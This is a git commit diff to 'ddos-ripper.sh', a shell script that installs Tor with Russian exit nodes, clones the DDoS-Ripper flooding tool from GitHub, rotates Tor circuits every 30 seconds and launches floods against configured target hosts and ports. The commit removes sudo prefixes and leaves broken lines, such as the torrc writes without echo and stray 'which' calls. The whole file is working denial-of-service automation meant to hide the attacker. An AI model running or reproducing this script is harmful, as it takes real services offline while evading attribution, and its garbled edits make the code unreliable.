a5de915ce5dc0f65f593bc7a6cf470aae7f5a9f8
Roman Rabodzei <60527121+romanrabodzei@users.noreply.github.com>
2022-03-04 14:03:32 +0200

    Update ddos-ripper.sh

--- ddos-ripper.sh
+++ ddos-ripper.sh
@@ -6,15 +6,15 @@ TURBO=135
 QUIET="10000" 
  
 # --- Installing Common --- 
-sudo apt update 
-sudo apt install -y htop wget vim apache2-utils git 
+apt update 
+apt install -y htop wget vim apache2-utils git 
  
 # ---  Installing TOR   --- 
-sudo apt update 
-sudo apt install -y tor tor-geoipdb proxychains torsocks geoip-bin 
-echo "ExitNodes {ru}">> /etc/tor/torrc 
-echo "StrictNodes 1" >> /etc/tor/torrc 
-sudo service tor start 
+apt update 
+apt install -y tor tor-geoipdb proxychains torsocks geoip-bin 
+"ExitNodes {ru}">> /etc/tor/torrc 
+"StrictNodes 1" >> /etc/tor/torrc 
+service tor start 
  
 # Install DDoS-Ripper 
 git clone https://github.com/palahsu/DDoS-Ripper.git 
@@ -26,9 +26,9 @@ else
   exit 
 fi 
  
-sudo which screen -dm bash -c 'bash --init-file <(while true; do sudo service tor restart; sleep 30; done)' 
+which screen -dm bash -c 'bash --init-file <(while true; do sudo service tor restart; sleep 30; done)' 
  
 for target in $TARGET; 
 do 
-  sudo which screen -d -m -S $target which torsocks -P 9050 which python3 DRipper.py -s $TARGET -p $PORT -t $TURBO -q $QUIET 
+  which screen -d -m -S $target which torsocks -P 9050 which python3 DRipper.py -s $TARGET -p $PORT -t $TURBO -q $QUIET 
 done
